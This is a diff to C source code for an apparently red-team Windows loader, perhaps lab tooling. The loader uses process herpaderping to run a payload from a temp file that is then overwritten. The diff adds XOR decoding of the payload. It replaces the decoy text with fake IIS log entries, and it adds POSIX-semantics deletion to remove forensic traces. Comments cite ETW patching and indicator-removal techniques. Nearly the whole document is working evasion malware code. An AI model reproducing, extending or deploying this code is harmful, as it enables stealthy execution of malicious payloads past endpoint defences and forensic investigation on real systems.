@@ -36,6 +36,13 @@
 
 
 
+#ifdef ENABLE_PAYLOAD_XOR
+static const BYTE PAYLOAD_XOR_BASE = 0xA3;
+static const BYTE PAYLOAD_XOR_STEP = 0x5B;
+#endif
+
+
+
 #ifdef ENABLE_ETW_PATCH
 // B1 — ETW Patch (T1562.006): patch ntdll!EtwEventWrite → xor eax,eax; ret
 
@@ -280,6 +287,13 @@ BYTE *GetPayloadBuffer(OUT size_t &p_size)
 
 	DeleteFileW(PAYLOAD_PATH);  // T1070.004 - only in file mode
 
+#ifdef ENABLE_PAYLOAD_XOR
+	for (size_t i = 0; i < p_size; i++) {
+		bufferAddress[i] ^= (BYTE)((PAYLOAD_XOR_BASE + (BYTE)(i * PAYLOAD_XOR_STEP)) & 0xFF);
+	}
+	DBG_PRINT("GetPayloadBuffer: XOR decoded payload (%zu bytes)", p_size);
+#endif
+
 	return bufferAddress;
 
 }
@@ -396,6 +410,8 @@ BOOL Herpaderping(BYTE *payload, size_t payloadSize)
 	GetTempPathW(MAX_PATH, tempPath);
 	GetTempFileNameW(tempPath, L"HD", 0, tempFile);
 
+	// Open with FILE_SHARE_READ so NtCreateUserProcess can read for section creation.
+	// Keep handle open — do NOT close yet. We reuse it for overwrite after section is created.
 	hTemp = CreateFileW(tempFile, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
 						FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, 0);
 	if (hTemp == INVALID_HANDLE_VALUE)
@@ -409,7 +425,7 @@ BOOL Herpaderping(BYTE *payload, size_t payloadSize)
 		exit(-1);
 	}
 	FlushFileBuffers(hTemp);
-	CloseHandle(hTemp);
+	// hTemp intentionally left open — closed after overwrite below
 	DBG_PRINT("Herpaderping: temp file created and payload written: %ls (%lu bytes)", tempFile, bytesWritten);
 
 	// Build NT path for NtCreateUserProcess
@@ -484,26 +500,33 @@ BOOL Herpaderping(BYTE *payload, size_t payloadSize)
 	}
 	DBG_PRINT("Herpaderping: NtCreateUserProcess OK (hProcess=%p, hThread=%p, createInfo.State=%d)", hProcess, hThread, createInfo.State);
 
-	// Overwrite temp file with decoy content (best-effort anti-forensic)
-	hTemp = CreateFileW(tempFile, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE,
-						NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-	if (hTemp != INVALID_HANDLE_VALUE)
+	// Overwrite temp file with decoy content using pre-held handle.
+	// We kept hTemp open since file creation so the image section (created inside
+	// NtCreateUserProcess) cannot block our write — the section only needs READ
+	// on the file object; our existing GENERIC_WRITE handle is unaffected.
+	SetFilePointer(hTemp, 0, NULL, FILE_BEGIN);
+	SetEndOfFile(hTemp);
+	const char* decoyLines[] = {
+		"#Software: Microsoft Internet Information Services 10.0\r\n",
+		"#Version: 1.0\r\n",
+		"#Date: 2026-05-28 00:00:00\r\n",
+		"#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken\r\n",
+		"2026-05-28 08:14:02 10.0.0.5 GET /api/health - 443 - 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) - 200 0 0 15\r\n",
+		"2026-05-28 08:14:03 10.0.0.5 POST /api/upload/status - 443 TESTLAB\\svc_web 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) - 200 0 0 47\r\n",
+		"2026-05-28 08:14:05 10.0.0.5 GET /portal/assets/main.css - 443 - 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) https://upload.testlab.local/portal 200 0 0 3\r\n",
+		"2026-05-28 08:14:05 10.0.0.5 GET /portal/assets/app.js - 443 - 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) https://upload.testlab.local/portal 200 0 0 5\r\n",
+		"2026-05-28 08:14:07 10.0.0.5 GET /favicon.ico - 443 - 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) - 404 0 2 1\r\n",
+		"2026-05-28 08:14:12 10.0.0.5 POST /api/upload/chunk - 443 TESTLAB\\svc_web 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) https://upload.testlab.local/portal 200 0 0 203\r\n",
+	};
+	for (int i = 0; i < _countof(decoyLines); i++)
 	{
-		SetFilePointer(hTemp, 0, 0, FILE_BEGIN);
-		signed int bufferSize = 0x1000;
-		wchar_t bytesToWrite[] = L"Hello From CyberWarFare Labs\n";
-		while (bufferSize > 0)
-		{
-			WriteFile(hTemp, bytesToWrite, sizeof(bytesToWrite), &bytesWritten, NULL);
-			bufferSize -= bytesWritten;
-		}
-		CloseHandle(hTemp);
-		DBG_PRINT("Herpaderping: temp file overwritten with decoy content");
+		DWORD len = (DWORD)strlen(decoyLines[i]);
+		WriteFile(hTemp, decoyLines[i], len, &bytesWritten, NULL);
 	}
-	else
-	{
-		DBG_PRINT("Herpaderping: temp file overwrite skipped (section lock)");
-	}
+	FlushFileBuffers(hTemp);
+	CloseHandle(hTemp);
+	hTemp = INVALID_HANDLE_VALUE;
+	DBG_PRINT("Herpaderping: temp file overwritten with decoy content");
 
 	// Resume thread — Win32 API (no indirect syscall needed; benign call)
 	DWORD prevCount = ResumeThread(hThread);
@@ -514,13 +537,42 @@ BOOL Herpaderping(BYTE *payload, size_t payloadSize)
 	}
 	DBG_PRINT("Herpaderping: ResumeThread OK (prevSuspendCount=%lu), ghost process running", prevCount);
 
-	DeleteFileW(tempFile);
+	// POSIX delete: unlinks file from directory immediately even with active image section
+	{
+		_NtSetInformationFile pNtSetInformationFile = (_NtSetInformationFile)RESOLVE_API(hNtdll, NtSetInformationFile);
+		if (pNtSetInformationFile)
+		{
+			HANDLE hDel = CreateFileW(tempFile, DELETE, FILE_SHARE_READ | FILE_SHARE_DELETE,
+									  NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+			if (hDel != INVALID_HANDLE_VALUE)
+			{
+				IO_STATUS_BLOCK iosb = {0};
+				FILE_DISPOSITION_INFORMATION_EX dispEx;
+				dispEx.Flags = FILE_DISPOSITION_FLAG_DELETE | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS;
+				NTSTATUS st = pNtSetInformationFile(hDel, &iosb, &dispEx, sizeof(dispEx), FileDispositionInformationEx);
+				CloseHandle(hDel);
+				if (NT_SUCCESS(st))
+				{
+					DBG_PRINT("Herpaderping: temp file POSIX-deleted");
+				}
+				else
+				{
+					DBG_PRINT("Herpaderping: POSIX delete failed (0x%08lx), falling back to DeleteFileW", st);
+					DeleteFileW(tempFile);
+				}
+			}
+		}
+		else
+		{
+			DeleteFileW(tempFile);
+		}
+	}
 	return TRUE;
 }
 
 
 
-int main()
+int wmain()
 
 {
 
